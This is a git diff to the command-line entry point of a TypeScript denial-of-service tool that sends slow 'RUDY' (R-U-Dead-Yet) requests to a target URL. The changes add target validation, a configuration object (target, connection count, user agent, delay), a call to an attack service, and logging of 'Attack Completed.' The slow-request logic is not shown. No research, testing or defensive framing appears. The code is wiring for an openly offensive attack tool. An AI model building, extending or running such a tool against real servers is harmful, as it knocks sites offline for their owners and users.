@@ -9,10 +9,15 @@
 import * as program from "commander"
 import Rudy from "./main"
 import ASCIIBanner from "./utils/ascii"
+import { TargetNotFound, IError } from "./models/error.model"
+import RudyService from "./service/rudy.service"
+import logger from "./utils/logger"
+const logCategory: string = "RUDY_CLI"
+/* tslint:disable object-literal-sort-keys */
 
 // Parse Arguments
 program
-.version("1.0.0", "-v, --version")
+.version("1.0.0")
 .description("Sends slow RUDY Requests to target.")
 .option("-t, --target <string>", "Target URL to attack")
 .option("-c, --maxConnections <number>", "The number of connections to run simultaneously (Default: 50)")
@@ -24,9 +29,31 @@ program
 // Shows ASCII banner
 ASCIIBanner.showInfo()
 .then(() => {
-    // Show Help if Target is not specified
+    // Throw Error if Target not specified
     if (program.target == null) {
-        program.help()
-        process.exit(1)
+        throw TargetNotFound
     }
+
+    const config: Rudy.IRudyConfig = {
+        target: program.target,
+        maxConnections: program.maxConnections,
+        userAgent: program.userAgent,
+        delay: program.delay,
+        verbose: program.verbose,
+    }
+    return config
+})
+.then((config: Rudy.IRudyConfig) => {
+    const rudyService = new RudyService(config)
+    return rudyService.attack()
+})
+.then(() => {
+    logger.info({message: "Attack Completed.", category: logCategory})
+})
+.catch((error: IError) => {
+    // Show Help on Error
+    logger.error({message: error.message, category: error.category})
+    logger.info({message: "Stopping Attack", category: logCategory})
+    program.help()
+    process.exit()
 })
